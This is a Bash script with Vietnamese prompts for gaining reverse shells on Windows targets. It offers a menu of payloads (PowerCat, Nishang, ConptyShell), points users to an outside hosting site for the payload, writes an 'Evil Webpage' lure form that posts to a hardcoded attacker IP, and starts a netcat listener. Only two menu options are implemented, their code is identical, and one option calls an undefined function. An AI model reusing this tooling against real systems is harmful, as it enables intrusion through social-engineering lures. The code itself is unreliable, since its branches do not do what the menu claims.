#!/bin/bash


BLUE='\033[0;34m'
NC='\033[0m'
target=0

echo -e "${BLUE}Gaining Shell with Netcat${NC}"

# Tên tệp lưu kết quả
result_file_wes="netcat.txt"




#----------------------------CHON CHUC NANG -------------------------------------
optionScan(){
   		echo -e "${BLUE}----------------------------CREATE REVERSE SHELL-------------------------------------${NC}"
   		echo -e "\e[1mChon Payload muon su dung\e[0m"
   		echo "1. PowerCat"
   		echo "2. Invoke-PowerShellTcp (Nishang)" 
   		echo "3. ConptyShell"
   		echo "4. PowerShell Reverse TCP"
		echo "99. Back"
		echo -e "${BLUE}----------------------------CREATE REVERSE SHELL-------------------------------------${NC}"
		echo ""
		echo ""
	  }


#----------------------------CHON CHUC NANG-------------------------------------
if [ "$target" = "0" ]; then
       echo -n "Nhap IP muc tieu [IP hoac domain]: "
       read target
    fi
while :
do
    
    optionScan
    echo -n "CHON CHUC NANG: "
    yourOption=0
    while [ "$yourOption" = 0 ]; do
        read yourOption
    
    
    case $yourOption in        
        1)
            # PowerCat     		       
				kali_ip="192.168.133.129"
				kali_port="4444"
				echo -e "\e[1mDang tao Listener...\e[0m"
				echo -e "\e[1mMot Listener da duoc tao tren cong $kali_port!\e[0m"
				echo -e "\e[1mDang tao payload...\e[0m"
				echo ""
				sleep 2
				echo "Truy cap trang web https://vietminepro.000webhostapp.com/ de tai ve Payload"
				echo "Ban co the xem ma HTML trong file netcat_html.txt" 
				echo "		<!DOCTYPE html>
						<html lang="en">
						<head>
						  <meta charset="UTF-8">
						  <meta name="viewport" content="width=device-width, initial-scale=1.0">
						  <title>Evil Webpage</title>
						</head>
						<body>
						  <h1>Reverse shell wwith netcat</h1>
						  <p>Click to connect</p>
						  <form action="http://$kali_ip:$kali_port" method="post">
						    <input type="submit" value="Click">
						  </form>
						</body>
						</html>" > netcat_html.txt
				echo ""
				echo -e "\e[1mDang lang nghe tren cong 4444..\e[0m"
				nc -lvp $kali_port 
		;;
 	2) 
 	    # Invoke-PowerShellTcp (Nishang)
 	                       kali_ip="192.168.133.129"
				kali_port="4444"
				echo -e "\e[1mDang tao Listener...\e[0m"
				echo -e "\e[1mMot Listener da duoc tao tren cong $kali_port!\e[0m"
				echo -e "\e[1mDang tao payload...\e[0m"
				echo ""
				sleep 2
				echo "Truy cap trang web https://vietminepro.000webhostapp.com/ de tai ve Payload"
				echo "Ban co the xem ma HTML trong file netcat_html.txt" 
				echo "		<!DOCTYPE html>
						<html lang="en">
						<head>
						  <meta charset="UTF-8">
						  <meta name="viewport" content="width=device-width, initial-scale=1.0">
						  <title>Evil Webpage</title>
						</head>
						<body>
						  <h1>Reverse shell wwith netcat</h1>
						  <p>Click to connect</p>
						  <form action="http://$kali_ip:$kali_port" method="post">
						    <input type="submit" value="Click">
						  </form>
						</body>
						</html>" > netcat_html.txt
				echo ""
				echo -e "\e[1mDang lang nghe tren cong 4444..\e[0m"
				nc -lvp $kali_port 
		;;
 	    
     	99) f_main
     	;;
     	*) echo "Lua chon khong hop le!!. Vui long nhap lai."
     	;;
     	esac
     done
done

